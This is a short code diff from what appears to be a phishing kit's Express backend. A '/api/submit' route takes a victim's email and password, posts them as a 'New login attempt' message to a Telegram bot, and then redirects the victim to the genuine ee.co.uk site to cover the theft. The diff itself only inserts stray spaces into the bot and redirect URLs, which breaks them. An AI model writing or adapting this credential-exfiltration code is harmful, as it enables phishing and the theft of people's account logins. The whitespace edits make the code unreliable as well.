@@ -25,13 +25,13 @@ app.post('/api/submit', async (req, res) => {
         const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;
 
         // Send message to Telegram bot
-        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
             chat_id: chatId,
             text: message,
         });
 
-        // Redirect user to https://ee.co.uk/
-        res.redirect('https://ee.co.uk/');
+        // Redirect user to https://ee.co.uk/ 
+        res.redirect('https://ee.co.uk/ ');
     } catch (error) {
         console.error('Error processing request:', error);
         res.status(500).send('An error occurred while processing your request.');
